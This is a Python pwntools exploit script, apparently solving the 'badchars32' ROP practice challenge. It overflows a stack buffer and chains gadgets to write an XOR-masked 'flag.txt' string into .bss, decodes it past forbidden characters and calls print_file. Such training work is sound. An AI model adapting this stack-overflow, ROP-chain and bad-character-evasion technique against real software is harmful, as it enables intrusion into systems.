from pwn import *

elf = ELF("./badchars32")

print_file = elf.plt["print_file"]
bss_addr = elf.bss()
pop_ebp  = 0x80485bb
pop_ebx  = 0x804839d
pop3ret  = 0x80485b9    # pop_esi_edi_ebp
usefulGadgets_xor = 0x8048547  # xor_BYTE  PTR [ebp+0x0],bl
usefulGadgets_mov = 0x804854f  # mov_DWORD PTR [edi],esi

payload = b"A" * 44

def xor(offset):
    global payload, bss_addr, pop_ebp, pop_ebx, usefulGadgets_xor

    payload += p32(pop_ebp)
    payload += p32(bss_addr + offset)
    payload += p32(pop_ebx)
    payload += p32(0xf)
    payload += p32(usefulGadgets_xor)

def main():
    # 'x', 'g', 'a', '.'はそのまま使えない。

    global payload, pop3ret, bss_addr, usefulGadgets_mov, print_file

    payload += p32(pop3ret)
    payload += b"flnh"
    payload += p32(bss_addr)
    payload += b"BBBB"
    payload += p32(usefulGadgets_mov)

    payload += p32(pop3ret)
    payload += b"!twt"
    payload += p32(bss_addr + 4)
    payload += b"BBBB"
    payload += p32(usefulGadgets_mov)

    # xorで"flag.txt"に修正
    xor(2)
    xor(3)
    xor(4)
    xor(6)

    # flag.txtの表示
    payload += p32(print_file)
    payload += b"BBBB"
    payload += p32(bss_addr)
        
    p = elf.process()
    p.recvuntil("> ")
    p.sendline(payload)
    p.interactive()
        
    print(payload)



if __name__ == "__main__":
    main()